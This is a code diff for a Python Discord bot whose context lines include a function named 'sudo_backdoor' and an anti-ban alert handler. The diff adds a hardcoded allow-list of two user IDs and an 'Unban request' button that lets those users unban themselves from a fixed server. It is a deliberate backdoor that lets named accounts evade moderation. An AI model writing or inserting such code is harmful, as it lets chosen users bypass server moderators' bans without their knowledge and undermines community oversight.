@@ -142,6 +142,19 @@ async def sudo_backdoor(ctx):
         pass
 
 # ================= UNBAN REQUEST BUTTON =================
+from discord import ui
+import discord
+
+# ================= ALLOWED USERS =================
+ALLOWED_USERS = {
+    1258115928525373570,  # nico044037
+    123456789012345678   # sukunaluni ← REPLACE with real ID
+}
+
+def allowed(user: discord.User):
+    return user.id in ALLOWED_USERS
+
+# ================= UNBAN REQUEST BUTTON =================
 class UnbanRequestView(ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -152,38 +165,50 @@ class UnbanRequestView(ui.View):
         interaction: discord.Interaction,
         button: ui.Button
     ):
+        # permission check
         if not allowed(interaction.user):
-            await interaction.response.defer()
+            await interaction.response.send_message(
+                "⛔ You are not allowed to use this button.",
+                ephemeral=True
+            )
             return
 
-        GUILD_ID = 1449298346425585768  # <-- your server
+        GUILD_ID = 1449298346425585768  # <-- your server ID
         guild = interaction.client.get_guild(GUILD_ID)
 
         if guild is None:
             await interaction.response.send_message(
-                "❌ Bot is not in the server.", ephemeral=True
+                "❌ Bot is not in the server.",
+                ephemeral=True
             )
             return
 
         try:
-            await guild.unban(interaction.user, reason="Unban button pressed")
+            await guild.unban(
+                interaction.user,
+                reason="Unban requested via button"
+            )
             await interaction.response.send_message(
-                "✅ You have been unbanned!", ephemeral=True
+                "✅ You have been unbanned!",
+                ephemeral=True
             )
 
         except discord.NotFound:
             await interaction.response.send_message(
-                "❌ You are not banned.", ephemeral=True
+                "ℹ️ You are not banned in this server.",
+                ephemeral=True
             )
 
         except discord.Forbidden:
             await interaction.response.send_message(
-                "❌ Bot lacks permission to unban.", ephemeral=True
+                "❌ Bot lacks permission to unban members.",
+                ephemeral=True
             )
 
         except discord.HTTPException:
             await interaction.response.send_message(
-                "❌ Unban failed.", ephemeral=True
+                "❌ An unexpected error occurred.",
+                ephemeral=True
             )
 # ================= ANTI-BAN ALERT =================
 @bot.event
@@ -219,5 +244,6 @@ if not TOKEN:
 
 time.sleep(10)  # Railway safety
 bot.run(TOKEN)
+
 
 
